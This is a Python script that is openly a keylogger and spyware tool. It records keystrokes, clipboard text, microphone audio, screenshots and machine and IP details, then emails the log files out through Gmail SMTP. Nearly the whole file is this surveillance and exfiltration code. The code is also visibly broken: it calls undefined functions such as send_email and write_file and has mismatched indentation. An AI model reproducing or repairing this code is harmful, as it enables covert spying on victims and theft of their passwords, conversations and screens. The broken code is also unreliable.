# Libraries
# For Email - Module 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Default Module
import socket
import platform

# For Clipboard Module
import win32clipboard

# For Grabbing Keystroke
from pynput.keyboard import Key, Listener

# For Grabbing System Information(i.e time and system information)
import time
import os

#For Microphone Capture
from scipy.io.wavfile import write
import sounddevice as sd

# For Encrypt our file 
from cryptography.fernet import Fernet

# For Capturing Username and Password
import getpass
from requests import get

# For Taking Screenshot 
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

#Default Variable
keys_information = "key_log.txt"
system_information = "system_information.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenschot.png"
recorded_microphone_time = 10

file_path = "Directory where you want to save the file of log"
extend = "\\"
email_address = "example@gmail.com"
password = "1234"
to_the_given_address = "sender@gmail.com"

def send_the_email(filename, attachment, to_the_given_address):
    sender_address = email_address 
    
    msg = MIMEMultipart()
    msg['From'] = sender_address
    msg['To'] = to_the_given_address
    msg['Subject'] = "Log File"
    body = "Body_of_the_Mail"
    
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    
    # Adding the headers
    p.add_header('Content-Disposition',"attachment: filename= %s" % filename)
    msg.attach(p)
    
    # Creating an SMTP Session
    s = smtplib.SMTP('smtp.gmail.com',587)
    
    # Starting our tls session
    s.starttls()
    
    s.login(sender_address, password)
    text = msg.as_string()
    
    s.sendmail(sender_address, to_the_given_address, text)
    s.quit()
   



send_email(keys_information, file_path + extend + keys_information,to_the_given_address)

def computer_information():
    with open(file_path + extend + system_information ,"a") as comp_info:
        hostname = socket.gethostname()
        IP_Address = socket.gethostbyname(hostname)
        # Getting the Public Ip
        try:
            public_ip = get("https://api.ipify.org").text
            comp_info.write("Public IP Address: " + public_ip)
            
        except Exception:
            comp_info.write("Couldn't get the Public IP Address")
            
        comp_info.write("Processor: " + (platform.processor()) + '\n')
        comp_info.write("System: " + platform.system() + " " + platform.version() + '\n')
        comp_info.write("Machine: " + platform.machine() + "\n")
        comp_info.write("HostName: " + hostname + "\n")
        comp_info.write("Private IP Address" + IP_Address + "\n")
        
computer_information() 
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as clip_capture:
        # Capturing only the text not other file format and doesn't make our script to stop
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            clip_capture.write("Clipboard Data: \n" + pasted_data)
            
        except:
            #For Audio file and other types of files other than text
            clip_capture.write("Clipboard could not be copied")
            
copy_clipboard()            

def microphone():
    sampling_frequency = 44100
    seconds_to_capture = recorded_microphone_time 
    
    myrecording = sd.rec(int(seconds_to_capture * sampling_frequency), samplerate=sampling_frequency, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, sampling_frequency, myrecording)
            
microphone()        
            
def ScreenShot():
    capturing_Image = ImageGrab.grab()
    capturing_Image.save(file_path + extend + screenshot_information)
    
    
        
ScreenShot()
        
            
    
    
    
    
    
    
    

# Constant
key_count =0
# Empty list
keys = []

def on_press(key):
    global keys, key_count
    
    print(key)
    keys.append(key)
    key_count += 1
    
    if key_count >= 1:
        key_count = 0
        write_file(keys)
        keys = []
        
    
def write_to_file(keys):
    with open(file_path + extend + keys_information, "a") as file:
        for key in keys:
            adding_each_keystroke_to_word = str(key).replace("'","")
            if adding_each_keystroke_to_word.find("space") > 0 :
                file.write('\n')
                file.close()
                
             elif adding_each_keystroke_to_word.find("key") == -1:
                file.write(adding_each_keystroke_to_word)
                file.close()
                
 def  on_release(key):
    if key == key.esc:
        return False
    
 with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    
                
                
            
    
    
    





